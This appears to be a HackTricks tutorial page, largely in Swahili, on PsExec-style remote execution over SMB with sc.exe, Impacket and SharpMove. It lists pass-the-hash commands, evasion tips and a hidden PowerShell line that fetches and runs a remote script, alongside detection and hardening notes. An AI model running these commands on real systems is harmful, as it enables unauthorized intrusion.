# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## How do they work

Mbinu hizi zinatumia Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza amri kwenye mwenyeji wa lengo. Mchakato wa kawaida ni:

1. Thibitisha kwenye lengo na upate ADMIN$ share kupitia SMB (TCP/445).
2. Nakili executable au eleza amri ya LOLBAS ambayo huduma itakimbia.
3. Unda huduma kwa mbali kupitia SCM (MS-SCMR kupitia \PIPE\svcctl) ikielekeza kwenye amri hiyo au binary.
4. Anza huduma ili kutekeleza payload na kwa hiari kukamata stdin/stdout kupitia bomba lililotajwa.
5. Simamisha huduma na safisha (futa huduma na binaries zozote zilizotolewa).

Requirements/prereqs:
- Msimamizi wa Mitaa kwenye lengo (SeCreateServicePrivilege) au haki maalum za uundaji wa huduma kwenye lengo.
- SMB (445) inapatikana na ADMIN$ share inapatikana; Usimamizi wa Huduma za Mbali unaruhusiwa kupitia firewall ya mwenyeji.
- UAC Remote Restrictions: kwa akaunti za ndani, kuchuja token kunaweza kuzuia msimamizi kwenye mtandao isipokuwa ukitumia Msimamizi aliyejengwa au LocalAccountTokenFilterPolicy=1.
- Kerberos dhidi ya NTLM: kutumia jina la mwenyeji/FQDN kunaruhusu Kerberos; kuungana kwa IP mara nyingi hurudi nyuma kwa NTLM (na inaweza kuzuia katika mazingira yaliyolindwa).

### Manual ScExec/WinExec via sc.exe

Ifuatayo inaonyesha njia ya chini ya uundaji wa huduma. Picha ya huduma inaweza kuwa EXE iliyotolewa au LOLBAS kama cmd.exe au powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes:
- Tarajia makosa ya muda unapozindua EXE isiyo ya huduma; utekelezaji bado unafanyika.
- Ili kubaki rafiki zaidi kwa OPSEC, pendelea amri zisizo na faili (cmd /c, powershell -enc) au futa vitu vilivyotolewa.

Find more detailed steps in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Tooling and examples

### Sysinternals PsExec.exe

- Kifaa cha jadi cha admin kinachotumia SMB kuweka PSEXESVC.exe katika ADMIN$, kinaweka huduma ya muda (jina la default PSEXESVC), na kuhamasisha I/O kupitia bomba zenye majina.
- Mfano wa matumizi:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Unaweza kuzindua moja kwa moja kutoka Sysinternals Live kupitia WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Acha matukio ya kufunga/kufuta huduma (Jina la huduma mara nyingi ni PSEXESVC isipokuwa -r itumike) na kuunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.

### Impacket psexec.py (Kama PsExec)

- Inatumia huduma iliyojumuishwa kama RemCom. Inatua faili ya huduma ya muda (jina mara nyingi limepangwa) kupitia ADMIN$, inaunda huduma (kawaida ni RemComSvc), na inasimamia I/O kupitia bomba lililopewa jina.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- EXE ya muda katika C:\Windows\ (herufi 8 za nasibu). Jina la huduma linakuwa RemComSvc isipokuwa likabadilishwa.

### Impacket smbexec.py (SMBExec)

- Inaunda huduma ya muda inayozalisha cmd.exe na kutumia bomba lililotajwa kwa I/O. Kwa ujumla inakwepa kuacha mzigo kamili wa EXE; utekelezaji wa amri ni wa nusu-interactive.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral na SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) inatekeleza mbinu kadhaa za harakati za upande ikiwa ni pamoja na exec inayotegemea huduma.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inajumuisha mabadiliko/kuunda huduma ili kutekeleza amri kwa mbali.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Unaweza pia kutumia CrackMapExec kutekeleza kupitia nyuma tofauti (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, kugundua na artefakti

Artefakti za kawaida za mwenyeji/mtandao wakati wa kutumia mbinu kama PsExec:
- Usalama 4624 (Aina ya Logon 3) na 4672 (Privileji Maalum) kwenye lengo kwa akaunti ya admin iliyotumika.
- Usalama 5140/5145 Matukio ya Kushiriki Faili na Maelezo ya Kushiriki Faili yanaonyesha ufikiaji wa ADMIN$ na kuunda/kandika binaries za huduma (mfano, PSEXESVC.exe au .exe ya herufi 8 zisizo na mpangilio).
- Usalama 7045 Usakinishaji wa Huduma kwenye lengo: majina ya huduma kama PSEXESVC, RemComSvc, au desturi (-r / -service-name).
- Sysmon 1 (Kuunda Mchakato) kwa services.exe au picha ya huduma, 3 (Kuunganisha Mtandao), 11 (Kuunda Faili) katika C:\Windows\, 17/18 (Pipa Iliyoundwa/Iliyounganishwa) kwa pipa kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au sawa zisizo na mpangilio.
- Artefakti ya Registry kwa Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye mwenyeji wa opereta (ikiwa haijakandamizwa).

Mawazo ya uwindaji
- Onyo juu ya usakinishaji wa huduma ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au maeneo ya TEMP.
- Tafuta uundaji wa mchakato ambapo ParentImage ni C:\Windows\PSEXESVC.exe au watoto wa services.exe wakifanya kazi kama LOCAL SYSTEM wakitekeleza shells.
- Alama pipa zenye majina yanayomalizika na -stdin/-stdout/-stderr au majina maarufu ya pipa ya nakala ya PsExec.

## Kutatua matatizo ya kawaida
- Ufikiaji umekataliwa (5) wakati wa kuunda huduma: si kweli admin wa ndani, vizuizi vya UAC kwa akaunti za ndani, au ulinzi wa kuingilia kati wa EDR kwenye njia ya binary ya huduma.
- Njia ya mtandao haikupatikana (53) au haikuweza kuungana na ADMIN$: firewall inazuia SMB/RPC au kushiriki kwa admin kumekataliwa.
- Kerberos inashindwa lakini NTLM imezuiwa: ungana kwa kutumia jina la mwenyeji/FQDN (sio IP), hakikisha SPNs sahihi, au toa -k/-no-pass na tiketi unapotumia Impacket.
- Muda wa kuanzisha huduma unakosa lakini payload ilikimbia: inatarajiwa ikiwa si binary halisi ya huduma; kamata matokeo kwenye faili au tumia smbexec kwa I/O ya moja kwa moja.

## Maelezo ya kuimarisha (mabadiliko ya kisasa)
- Windows 11 24H2 na Windows Server 2025 zinahitaji usajili wa SMB kwa default kwa muunganisho wa nje (na Windows 11 wa ndani). Hii haivunji matumizi halali ya PsExec na akreditif sahihi lakini inazuia matumizi mabaya ya SMB relay yasiyo na saini na inaweza kuathiri vifaa ambavyo havisaidii usajili.
- Mteja mpya wa SMB kuzuia NTLM (Windows 11 24H2/Server 2025) kunaweza kuzuia kurudi nyuma kwa NTLM unapotumia IP au kuungana na seva zisizo za Kerberos. Katika mazingira yaliyoimarishwa hii itavunja PsExec/SMBExec inayotegemea NTLM; tumia Kerberos (jina la mwenyeji/FQDN) au tengeneza visamehe ikiwa inahitajika kwa halali.
- Kanuni ya haki ndogo: punguza uanachama wa admin wa ndani, pendelea Just-in-Time/Just-Enough Admin, enforce LAPS, na fuatilia/onja juu ya usakinishaji wa huduma 7045.

## Tazama pia

- WMI-based remote exec (mara nyingi zaidi bila faili):
{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:
{{#ref}}
./winrm.md
{{#endref}}



## Marejeleo

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Kuimarisha usalama wa SMB katika Windows Server 2025 & Windows 11 (usajili kwa default, kuzuia NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
